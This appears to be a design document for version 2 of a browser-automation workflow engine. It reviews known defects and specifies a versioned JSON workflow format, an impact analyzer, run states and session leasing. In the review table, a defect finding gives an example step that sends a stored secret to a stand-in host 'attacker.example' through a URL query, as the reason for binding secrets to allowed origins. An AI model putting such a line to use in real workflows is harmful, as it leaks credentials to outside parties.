# 10 — Workflow Engine V2

## 1. Review of the existing implementation

| Area                        | Status                                                                                                 | Evidence                                 | Keep / fix                                                                                                                                                                        |
| --------------------------- | ------------------------------------------------------------------------------------------------------ | ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Schema (v1)                 | 20 actions, assertions, extract, `when`, `dependsOn`, retry, `idempotent`, `continueOnError`, sessions | `workflow-schema.ts`                     | Keep; `input` is an untyped `record<unknown>` (`:84`) → typed per action in v2                                                                                                    |
| Validator                   | duplicate ids, forward/unknown deps, required inputs, targets, undefined vars, regex validity          | `workflow-validator.ts`                  | Keep                                                                                                                                                                              |
| Variables & extraction      | single-pass `${var}` interpolation; extraction from text/value/attribute/url/title + regex             | `workflow-engine.ts:549-569`, `:451-478` | Keep                                                                                                                                                                              |
| Secret references           | `${secret.X}` → env `TG_SECRET_X`; masked in messages                                                  | `:552-559`                               | **Fix D14**: no binding of secrets to steps/origins; an inline workflow can send any `TG_SECRET_*` to any allowed host (e.g. `navigate https://attacker.example/?k=${secret.DB}`) |
| Conditions                  | safe mini-language, no eval                                                                            | `:572-591`                               | Keep                                                                                                                                                                              |
| Retries                     | only for `IDEMPOTENT_ACTIONS` or `idempotent:true`                                                     | `:272-295`                               | **Fix D13** (`fill`+`submit`); derive class from inputs (doc 04 §5)                                                                                                               |
| Step timeout & cancellation | race; in-flight action not stopped                                                                     | `:603-620`                               | **Fix D12**                                                                                                                                                                       |
| Checkpoints                 | full record rewritten after each step, non-atomic                                                      | `:129-138`                               | **Fix D9**; move to `RunRepository`                                                                                                                                               |
| Resume (`startAt`)          | skips earlier steps, **does not restore extracted variables**                                          | `:236-254`                               | **Fix D19**: `resumeFrom: runId` loads variables + session expectations                                                                                                           |
| Sessions                    | found by name in config project, created if missing, reused if existing                                | `:349-361`                               | **Fix D16**: run-owned sessions (prefix `run-<id>-`) by default or explicit `share: true` lease                                                                                   |
| Assertions                  | AssertionEngine; failure messages may leak values                                                      | `:442-450`                               | **Fix D7** (mask secrets + sensitive fields in assertion actual/expected)                                                                                                         |
| Diagnostics                 | screenshot (unmasked) + console + network                                                              | `:482-504`                               | mask sensitive fields in screenshots (Playwright `mask`)                                                                                                                          |
| Recorder                    | refs → `suggestLocator`, sensitive → `${secret.KEY}`                                                   | `workflow-recorder.ts`                   | Keep; record container scope (doc 03) instead of bare role+name                                                                                                                   |
| Test generator              | multi-context spec                                                                                     | `test-generator.ts`                      | **Fix D3** (template-literal injection), validate identifiers                                                                                                                     |
| Reports                     | Markdown, JUnit                                                                                        | `report-generator.ts`                    | Keep                                                                                                                                                                              |
| Versioning                  | none (`version: z.literal(1)`)                                                                         | `:106`                                   | V2                                                                                                                                                                                |

## 2. Versioned DSL (backward compatible)

- `version: 1` workflows load and run unchanged forever (no forced migration). The validator accepts `version: 1 | 2`; v1 files are interpreted as v2 with defaults.
- New top-level fields: `schemaVersion: 2` (alias of `version` for clarity), `workflowVersion` (semver or integer, author-controlled), `description`, `requires: { features: [...] }` so older engines fail with a clear message instead of misinterpreting.

```jsonc
{
  "schemaVersion": 2,
  "name": "create-loan-request",
  "workflowVersion": 3,
  "sessions": { "maker": { "restore": true } },
  "secrets": { "MAKER_PASSWORD": { "origins": ["https://bpa.corp.example"] } }, // D14 fix: allowed destinations
  "steps": [
    {
      "id": "fill-request",
      "session": "maker",
      "action": "fill_form",
      "page": { "routeKey": "/request/create", "pageKey": "create-request" }, // pageIdentity
      "pre": [{ "type": "url", "matches": "/request/create" }], // preconditions
      "input": {
        "within": { "role": "form", "name": "Request form" },
        "fields": [
          {
            "target": {
              "memoryId": "el_7Qx2",
              "semantic": { "role": "textbox", "name": "Customer Name" },
              "fallback": [{ "testId": "customer" }, { "label": "Customer Name" }],
            },
            "value": "${customer}",
          },
        ],
      },
      "expect": [{ "type": "validation", "outcome": "valid" }],
    },
    {
      "id": "submit",
      "session": "maker",
      "action": "click",
      "input": { "target": { "semantic": { "role": "button", "name": "Submit" } } },
      "expect": [
        {
          "type": "response",
          "urlPattern": "**/api/requests",
          "method": "POST",
          "status": [200, 201],
          "json": [{ "path": "status", "equals": "PENDING_APPROVAL" }],
        },
        { "type": "text", "contains": "submitted successfully" },
      ],
      "recovery": { "onIndeterminate": "verify-then-stop" }, // never blind retry
    },
  ],
}
```

Target resolution order for a step: live semantic target (scoped `within`) → `fallback` locators → memory candidates via `memoryId` (doc 08 policy) → fail with suggestions. `elementMemoryId` is a hint only.

`recovery` options are deliberately limited: `retry` (only for idempotent classes), `verify-then-stop`, `verify-then-continue` (re-check `expect` after re-snapshot; continue only if VERIFIED), `stop`. No "click again".

## 3. Workflow impact analyzer

Inputs: a reconciliation result (doc 07) for a page version, and `workflow_dependencies` (derived from definitions: step → page key, step → element memory ids/semantic keys, step → `fills_form`).

Compatibility states (per workflow, worst step wins; per-step detail retained):

| State                | Rule                                                                                                                                                                                                                              |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `COMPATIBLE`         | no dependency on changed elements; page unchanged or only `ADDED` optional fields                                                                                                                                                 |
| `NEEDS_REVALIDATION` | depends on `MODIFIED` elements (label/required/container changed)                                                                                                                                                                 |
| `NEEDS_INPUT`        | fills/submits a form on a page where an `ADDED` field is `required` and the workflow provides no value — **detected via page dependency, not element dependency**, because the field did not exist when the workflow was recorded |
| `BROKEN`             | depends on `REMOVED` or `INCOMPATIBLE` elements                                                                                                                                                                                   |
| `AMBIGUOUS`          | depends on elements classified `AMBIGUOUS`                                                                                                                                                                                        |
| `REVIEW_REQUIRED`    | changed element is involved in a high-impact step (approve/submit/delete/transfer) or the step's `expect` references changed text                                                                                                 |
| `UNKNOWN`            | page not observed since the change (no complete observation for the relevant variant)                                                                                                                                             |

Outputs: list per state with the steps and changes involved; migration candidates (doc 08) for `NEEDS_REVALIDATION` with strong-key matches; nothing automatic for `NEEDS_INPUT`, `BROKEN`, `REVIEW_REQUIRED`.

## 4. Execution status model

Run: `queued → running → passed | failed | cancelled | indeterminate` (new: a non-idempotent step ended `INDETERMINATE`). Step: `pending → running → passed | failed | skipped | indeterminate`, plus `verification` (doc 04) and `healed` flag.

## 5. Import / export compatibility

- Export writes v1 when only v1 features are used; v2 otherwise.
- Import validates, computes SHA-256, rejects unknown `requires.features`, strips `memoryId`s that don't exist in the target scope (keeps semantic targets), and **never imports secrets** (only names + allowed origins).
- Imported workflows are untrusted: inline/imported definitions cannot widen `secrets.origins` beyond the operator's config allowlist (`workflows.secretOrigins` in config), and test generation from imported workflows is subject to the D3 fix.

## 6. Concurrency rules for runs

- A run acquires a **lease** on each session it uses (in-memory + `workflow_runs.owner`); interactive tools on a leased session return `SESSION_BUSY` unless the caller passes the run id. Default: runs create their own sessions (`run-<shortid>-maker`) and close them at the end (with `restore` for logins).
- Two runs of the same workflow are allowed (different sessions); same-session sharing requires explicit opt-in.
